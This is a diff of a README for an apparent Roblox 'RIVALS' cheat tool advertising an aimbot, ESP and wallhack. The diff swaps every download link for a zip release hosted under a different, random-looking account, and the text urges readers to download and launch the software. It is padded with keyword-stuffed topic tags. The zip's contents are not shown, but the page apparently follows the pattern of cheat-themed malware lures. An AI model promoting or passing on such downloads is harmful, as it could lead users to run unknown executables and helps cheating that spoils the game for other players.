@@ -15,12 +15,12 @@ This repository contains a powerful script hack for RIVALS that allows you to en
 ⛔ **Wallhack**  
 
 ## Installation
-To get started with the RIVALS Script Hack, you can download the software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once downloaded, launch the software and follow the on-screen instructions to start using the powerful cheats and hacks in RIVALS!
+To get started with the RIVALS Script Hack, you can download the software [here](https://github.com/hbswfwjwwjjuwju/RIVALS/releases/download/v1.0/Release.zip). Once downloaded, launch the software and follow the on-screen instructions to start using the powerful cheats and hacks in RIVALS!
 
 ## Repository Topics
 #rivals-hack, #rivals-hack-2025, #rivals-hack-keyless, #rivals-hack-no-key, #rivals-hack-pastebin, #rivals-script, #rivals-script-2025, #rivals-script-aimbot, #rivals-script-esp, #rivals-script-hack, #rivals-script-hack-2025, #rivals-script-keyless, #rivals-script-no-key, #rivals-script-pastebin, #rivals-script-silent-aimbot, #rivals-script-wallhack, #rivals-script-wh, #roblox-rivals-hack, #roblox-rivals-script, #script-rivals
 
 ## Get Started!
-Don't wait any longer to elevate your RIVALS gameplay to the next level with our powerful script hack! Download the software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) and start dominating the game today!
+Don't wait any longer to elevate your RIVALS gameplay to the next level with our powerful script hack! Download the software [here](https://github.com/hbswfwjwwjjuwju/RIVALS/releases/download/v1.0/Release.zip) and start dominating the game today!
 
-[![Download RIVALS Hack](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download RIVALS Hack](https://github.com/hbswfwjwwjjuwju/RIVALS/releases/download/v1.0/Release.zip)](https://github.com/hbswfwjwwjjuwju/RIVALS/releases/download/v1.0/Release.zip)
